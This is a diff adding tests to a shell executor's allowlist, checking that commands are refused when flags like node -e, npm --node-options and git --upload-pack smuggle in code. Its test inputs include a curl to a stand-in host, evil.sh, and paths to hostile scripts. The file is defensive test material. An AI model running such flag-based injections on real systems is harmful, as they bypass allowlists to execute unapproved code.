@@ -227,6 +227,29 @@ describe('shell executor', () => {
     expect(client.calls).toEqual([]);
   });
 
+  it.each([
+    ['node -e "require(\'child_process\').execSync(\'curl evil.sh\')"', 'node', '-e'],
+    ['npm --node-options=--require=/tmp/evil.js test', 'npm', '--node-options'],
+    ['git --upload-pack=/tmp/evil.sh clone x', 'git', '--upload-pack'],
+  ])('refuses %s — the flag executes code the allowlist never approved', async (command, exe, _flag) => {
+    const client = shellClient();
+    const node = { id: 't', type: 'shell', run: command } as FlowNode;
+
+    await expect(
+      createShellExecutor(client, { allowlist: [exe] })(contextFor(node, { run: command }))
+    ).rejects.toThrow(/not allowed for/);
+    expect(client.calls).toEqual([]);
+  });
+
+  it('still allows an ordinary flag the executable needs', async () => {
+    const client = shellClient();
+    const node = { id: 't', type: 'shell', run: 'git status --short' } as FlowNode;
+
+    await expect(
+      createShellExecutor(client, { allowlist: ['git'] })(contextFor(node, { run: 'git status --short' }))
+    ).resolves.toBeDefined();
+  });
+
   it('refuses everything when the allowlist is empty', async () => {
     const client = shellClient();
     const node = { id: 't', type: 'shell', run: 'npm test' } as FlowNode;
